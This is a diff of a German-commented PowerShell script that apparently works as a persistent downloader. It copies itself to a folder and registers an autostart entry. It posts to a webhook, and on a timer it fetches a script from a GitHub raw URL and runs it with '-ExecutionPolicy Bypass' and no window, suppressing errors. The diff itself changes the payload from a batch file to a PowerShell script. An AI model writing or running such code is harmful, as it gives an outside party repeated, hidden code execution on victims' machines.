@@ -18,7 +18,8 @@ $message = @{
 # Intervall für die Überprüfung in Sekunden (z.B. alle 5 Minuten)
 $checkInterval = 10
 #Url zu den Github Dateien
-$url = "https://raw.githubusercontent.com/Samuitl/New-Test/main/start.bat"
+$url = "https://raw.githubusercontent.com/Samuitl/New-Test/main/start.ps1"
+
 # Überprüfen und Erstellen des Zielpfads
 if (-not (Test-Path -Path $TargetPath)) {
     New-Item -Path $TargetPath -ItemType Directory -Force
@@ -26,6 +27,12 @@ if (-not (Test-Path -Path $TargetPath)) {
     $ScriptContents = $MyInvocation.MyCommand.ScriptContents
     $ScriptContents | Out-File -FilePath "$TargetPath\MyCopy.ps1" -Encoding utf8
 }
+if (-not (Test-Path -Path $TargetPath\MyCopy.ps1)) {
+    # Kopieren des eigenen Skriptes in das Zielverzeichnis
+    $ScriptContents = $MyInvocation.MyCommand.ScriptContents
+    $ScriptContents | Out-File -FilePath "$TargetPath\MyCopy.ps1" -Encoding utf8
+    }
+ 
 # Einrichten des Autostart-Eintrags
 try {
     Get-ItemProperty -Path $RegKeyPath -Name $valueName -ErrorAction Stop
@@ -40,11 +47,11 @@ Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($message | ConvertTo-Json
 # Funktion zum Herunterladen und Ausführen des Files
 function DownloadAndExecuteFile {
     # Herunterladen des Files
-    Invoke-WebRequest -Uri $url -OutFile "$TargetPath\start.bat" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri $url -OutFile "$TargetPath\start.ps1" -ErrorAction SilentlyContinue
     # Überprüfen, ob das File erfolgreich heruntergeladen wurde
-    if (Test-Path "$TargetPath\start.bat") {
+    if (Test-Path "$TargetPath\start.ps1") {
         # Ausführen des heruntergeladenen Files
-        & "$TargetPath\start.bat"
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$TargetPath\start.ps1`"" -NoNewWindow
     }
 }
 # Schleife für die regelmäßige Ausführung
